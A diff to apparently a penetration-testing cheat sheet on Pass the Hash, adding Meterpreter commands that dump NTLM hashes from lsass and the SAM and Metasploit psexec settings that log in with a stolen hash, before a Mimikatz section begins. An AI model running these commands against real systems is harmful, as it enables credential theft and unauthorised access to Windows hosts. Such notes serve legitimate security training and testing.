@@ -1,4 +1,20 @@
 A [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication.
+## Pass the Hash with Meterpreter
+```
+# user: NT AUTHORITY\ SYSTEM
+meterpreter> pgrep lsass
+meterpreter> migrate 780
+meterpreter> load kiwi
+meterpreter> lsa_dump_sam
+	# result list hash ntlm 
+meterpreter> hashdump
+	# user_name:user_ID:hash_LM:hash_NTLM:::
+# msfconsole
+use exploit/windows/smb/psexec
+> set smbuser Administrator
+> set smbpass hash_LM:hash_NTLM
+> set target Native\ Upload
+```
 ## Pass the Hash with Mimikatz (Windows)
 Mimikatz has a module named `sekurlsa::pth` that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password. To use this module, we will need the following:
 ```powershell
